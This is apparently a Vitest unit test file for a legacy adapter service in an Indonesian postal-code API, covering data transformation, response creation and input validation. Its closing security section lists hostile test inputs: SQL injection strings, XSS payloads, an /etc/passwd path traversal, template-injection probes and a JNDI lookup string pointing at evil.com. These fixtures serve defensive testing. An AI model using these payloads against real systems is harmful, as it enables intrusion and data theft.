/**
 * Unit Tests for Legacy Adapter Service
 * Tests legacy format transformation and response creation
 */

import { describe, it, expect } from 'vitest';
import type { KodeposData } from '../../src/types/kodepos';
import {
  transformToLegacyFormat,
  transformToLegacyDetectFormat,
  createLegacyResponse,
  createLegacyErrorResponse,
  createLegacyNotFoundResponse,
  createLegacyServerErrorResponse,
  validateSearchQuery,
  validateCoordinates,
  formatDistance
} from '../../src/services/legacy-adapter.service';

describe('Legacy Adapter Service', () => {
  const mockKodeposData: KodeposData = {
    id: 1,
    code: 10110,
    village: 'Petonggan',
    district: 'Ketapang',
    regency: 'Sungai Penuh',
    province: 'Jambi',
    latitude: -2.0374,
    longitude: 101.6543,
    elevation: 100,
    timezone: 'WIB'
  };

  const mockKodeposArray: KodeposData[] = [mockKodeposData, {
    id: 2,
    code: 10120,
    village: 'Pasar Sungai Penuh',
    district: 'Koto Baru',
    regency: 'Sungai Penuh',
    province: 'Jambi',
    latitude: -2.0527,
    longitude: 101.6519,
    elevation: 95,
    timezone: 'WIB'
  }];

  describe('transformToLegacyFormat', () => {
    it('should transform single KodeposData to legacy format', () => {
      const result = transformToLegacyFormat(mockKodeposData);

      expect(Array.isArray(result)).toBe(true);
      expect(result).toHaveLength(1);
      expect(result[0]).toEqual({
        code: '10110',
        village: 'Petonggan',
        district: 'Ketapang',
        regency: 'Sungai Penuh',
        province: 'Jambi',
        latitude: -2.0374,
        longitude: 101.6543,
        elevation: 100,
        timezone: 'WIB'
      });
    });

    it('should transform array of KodeposData to legacy format', () => {
      const result = transformToLegacyFormat(mockKodeposArray);

      expect(Array.isArray(result)).toBe(true);
      expect(result).toHaveLength(2);
      expect(result[0].code).toBe('10110');
      expect(result[1].code).toBe('10120');
      expect(result[0].village).toBe('Petonggan');
      expect(result[1].village).toBe('Pasar Sungai Penuh');
    });

    it('should handle missing fields gracefully', () => {
      const incompleteData: Partial<KodeposData> = {
        id: 1,
        code: 10110,
        village: 'Test Village'
      };

      const result = transformToLegacyFormat(incompleteData as KodeposData);

      expect(result[0]).toEqual({
        code: '10110',
        village: 'Test Village',
        district: '',
        regency: '',
        province: '',
        latitude: 0,
        longitude: 0,
        elevation: null,
        timezone: 'WIB'
      });
    });

    it('should handle null and undefined values', () => {
      const nullData = {
        id: 1,
        code: null as any,
        village: null as any,
        district: null as any,
        regency: null as any,
        province: null as any,
        latitude: null as any,
        longitude: null as any,
        elevation: null as any,
        timezone: null as any
      };

      const result = transformToLegacyFormat(nullData);

      expect(result[0]).toEqual({
        code: '0',
        village: '',
        district: '',
        regency: '',
        province: '',
        latitude: 0,
        longitude: 0,
        elevation: null,
        timezone: 'WIB'
      });
    });

    it('should handle empty array', () => {
      const result = transformToLegacyFormat([]);

      expect(Array.isArray(result)).toBe(true);
      expect(result).toHaveLength(0);
    });
  });

  describe('transformToLegacyDetectFormat', () => {
    it('should transform to legacy detect format with distance', () => {
      const result = transformToLegacyDetectFormat(mockKodeposData, 1.5);

      expect(result).toEqual({
        code: 10110,
        village: 'Petonggan',
        district: 'Ketapang',
        regency: 'Sungai Penuh',
        province: 'Jambi',
        latitude: -2.0374,
        longitude: 101.6543,
        elevation: 100,
        timezone: 'WIB',
        distance: 1.5
      });
    });

    it('should transform to legacy detect format without distance', () => {
      const result = transformToLegacyDetectFormat(mockKodeposData);

      expect(result.distance).toBe(0);
    });

    it('should use distance_km from item if distance not provided', () => {
      const itemWithDistance = {
        ...mockKodeposData,
        distance_km: 2.3
      };

      const result = transformToLegacyDetectFormat(itemWithDistance);

      expect(result.distance).toBe(2.3);
    });

    it('should handle missing fields in detect format', () => {
      const incompleteData = {
        code: 10110,
        village: 'Test'
      };

      const result = transformToLegacyDetectFormat(incompleteData, 1.0);

      expect(result).toEqual({
        code: 10110,
        village: 'Test',
        district: '',
        regency: '',
        province: '',
        latitude: 0,
        longitude: 0,
        elevation: 0,
        timezone: 'WIB',
        distance: 1.0
      });
    });
  });

  describe('response creators', () => {
    it('should create successful legacy response', () => {
      const data = { test: 'data' };
      const result = createLegacyResponse(data, 'SUCCESS');

      expect(result).toEqual({
        statusCode: 200,
        code: 'SUCCESS',
        data
      });
    });

    it('should create successful legacy response with default code', () => {
      const data = { test: 'data' };
      const result = createLegacyResponse(data);

      expect(result.code).toBe('OK');
    });

    it('should create error legacy response', () => {
      const result = createLegacyErrorResponse('Bad request', 400);

      expect(result).toEqual({
        statusCode: 400,
        code: 'ERROR',
        data: []
      });
    });

    it('should create error legacy response with default status', () => {
      const result = createLegacyErrorResponse('Error');

      expect(result.statusCode).toBe(400);
    });

    it('should create not found legacy response', () => {
      const result = createLegacyNotFoundResponse('Custom not found');

      expect(result).toEqual({
        statusCode: 404,
        code: 'NOT_FOUND',
        data: []
      });
    });

    it('should create not found legacy response with default message', () => {
      const result = createLegacyNotFoundResponse();

      expect(result.data).toEqual([]);
      expect(result.code).toBe('NOT_FOUND');
    });

    it('should create server error legacy response', () => {
      const result = createLegacyServerErrorResponse('Database error');

      expect(result).toEqual({
        statusCode: 500,
        code: 'SERVER_ERROR',
        data: []
      });
    });

    it('should create server error legacy response with default message', () => {
      const result = createLegacyServerErrorResponse();

      expect(result.data).toEqual([]);
      expect(result.code).toBe('SERVER_ERROR');
    });
  });

  describe('validateSearchQuery', () => {
    it('should validate correct search query', () => {
      const result = validateSearchQuery('Jakarta');

      expect(result.valid).toBe(true);
      expect(result.query).toBe('Jakarta');
    });

    it('should trim whitespace from query', () => {
      const result = validateSearchQuery('  Jakarta  ');

      expect(result.valid).toBe(true);
      expect(result.query).toBe('Jakarta');
    });

    it('should reject null query', () => {
      const result = validateSearchQuery(null);

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Missing required parameter: q');
    });

    it('should reject undefined query', () => {
      const result = validateSearchQuery(undefined);

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Missing required parameter: q');
    });

    it('should reject empty string query', () => {
      const result = validateSearchQuery('');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Query parameter cannot be empty');
    });

    it('should reject whitespace-only query', () => {
      const result = validateSearchQuery('   ');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Query parameter cannot be empty');
    });

    it('should reject overly long query', () => {
      const longQuery = 'a'.repeat(101);
      const result = validateSearchQuery(longQuery);

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Query parameter too long (max 100 characters)');
    });

    it('should accept query at maximum length', () => {
      const maxLengthQuery = 'a'.repeat(100);
      const result = validateSearchQuery(maxLengthQuery);

      expect(result.valid).toBe(true);
      expect(result.query).toBe(maxLengthQuery);
    });

    it('should handle special characters in query', () => {
      const specialQuery = 'Jakarta!@#$%^&*()';
      const result = validateSearchQuery(specialQuery);

      expect(result.valid).toBe(true);
      expect(result.query).toBe(specialQuery);
    });

    it('should handle potential XSS in query', () => {
      const xssQuery = '<script>alert("xss")</script>';
      const result = validateSearchQuery(xssQuery);

      // Should accept for now, but proper sanitization should happen at higher level
      expect(result.valid).toBe(true);
      expect(result.query).toBe(xssQuery);
    });
  });

  describe('validateCoordinates', () => {
    it('should validate correct Indonesian coordinates', () => {
      const result = validateCoordinates('-2.5', '106.8');

      expect(result.valid).toBe(true);
      expect(result.latitude).toBe(-2.5);
      expect(result.longitude).toBe(106.8);
    });

    it('should reject missing latitude', () => {
      const result = validateCoordinates(null, '106.8');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Missing required parameters: latitude and longitude');
    });

    it('should reject missing longitude', () => {
      const result = validateCoordinates('-2.5', null);

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Missing required parameters: latitude and longitude');
    });

    it('should reject invalid latitude format', () => {
      const result = validateCoordinates('invalid', '106.8');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Invalid coordinates');
    });

    it('should reject invalid longitude format', () => {
      const result = validateCoordinates('-2.5', 'invalid');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Invalid coordinates');
    });

    it('should reject NaN coordinates', () => {
      const result = validateCoordinates('NaN', '106.8');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Invalid coordinates');
    });

    it('should reject Infinity coordinates', () => {
      const result = validateCoordinates('Infinity', '106.8');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Invalid coordinates');
    });

    it('should reject latitude outside Indonesian bounds - too low', () => {
      const result = validateCoordinates('-12', '106.8');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Latitude must be between -11 and 6 for Indonesian coordinates');
    });

    it('should reject latitude outside Indonesian bounds - too high', () => {
      const result = validateCoordinates('7', '106.8');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Latitude must be between -11 and 6 for Indonesian coordinates');
    });

    it('should reject longitude outside Indonesian bounds - too low', () => {
      const result = validateCoordinates('-2.5', '94');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Longitude must be between 95 and 141 for Indonesian coordinates');
    });

    it('should reject longitude outside Indonesian bounds - too high', () => {
      const result = validateCoordinates('-2.5', '142');

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Longitude must be between 95 and 141 for Indonesian coordinates');
    });

    it('should accept edge case Indonesian coordinates', () => {
      const result1 = validateCoordinates('-11', '95');
      const result2 = validateCoordinates('6', '141');

      expect(result1.valid).toBe(true);
      expect(result2.valid).toBe(true);
    });

    it('should handle coordinate precision', () => {
      const result = validateCoordinates('-2.0374', '101.6543');

      expect(result.valid).toBe(true);
      expect(result.latitude).toBe(-2.0374);
      expect(result.longitude).toBe(101.6543);
    });
  });

  describe('formatDistance', () => {
    it('should format distance in meters for small distances', () => {
      const result = formatDistance(0.5);

      expect(result).toBe('500m');
    });

    it('should format distance in kilometers with decimal for medium distances', () => {
      const result = formatDistance(5.7);

      expect(result).toBe('5.7km');
    });

    it('should format distance in rounded kilometers for large distances', () => {
      const result = formatDistance(15.2);

      expect(result).toBe('15km');
    });

    it('should handle zero distance', () => {
      const result = formatDistance(0);

      expect(result).toBe('0m');
    });

    it('should handle very small distances', () => {
      const result = formatDistance(0.001);

      expect(result).toBe('1m');
    });

    it('should handle exactly 1km', () => {
      const result = formatDistance(1);

      expect(result).toBe('1.0km');
    });

    it('should handle exactly 10km', () => {
      const result = formatDistance(10);

      expect(result).toBe('10km');
    });

    it('should handle decimal precision properly', () => {
      const result = formatDistance(0.123);

      expect(result).toBe('123m');
    });

    it('should handle very large distances', () => {
      const result = formatDistance(1000.5);

      expect(result).toBe('1001km');
    });
  });

  describe('security considerations', () => {
    it('should handle malicious input in search query gracefully', () => {
      const maliciousQueries = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        'javascript:void(0)',
        '${7*7}',
        '{{7*7}}',
        '<img src=x onerror=alert(1)>',
        'alert("xss")//',
        'SELECT * FROM users',
        'UNION SELECT * FROM passwords'
      ];

      maliciousQueries.forEach(query => {
        const result = validateSearchQuery(query);
        // Validation should pass but proper sanitization should happen at higher level
        expect(result.valid).toBe(true);
        expect(result.query).toBe(query.trim());
      });
    });

    it('should handle coordinate injection attempts', () => {
      const maliciousCoordinates = [
        ['0; DROP TABLE users; --', '106.8'],
        ['-2.5', '106.8; SELECT * FROM users; --'],
        ['${jndi:ldap://evil.com/a}', '106.8'],
        ['{{7*7}}', '106.8']
      ];

      maliciousCoordinates.forEach(([lat, lng]) => {
        const result = validateCoordinates(lat, lng);
        expect(result.valid).toBe(false);
        expect(result.error).toMatch(/Invalid coordinates/);
      });
    });

    it('should handle buffer overflow attempts', () => {
      const veryLongQuery = 'a'.repeat(1000);
      const result = validateSearchQuery(veryLongQuery);

      expect(result.valid).toBe(false);
      expect(result.error).toBe('Query parameter too long (max 100 characters)');
    });
  });
});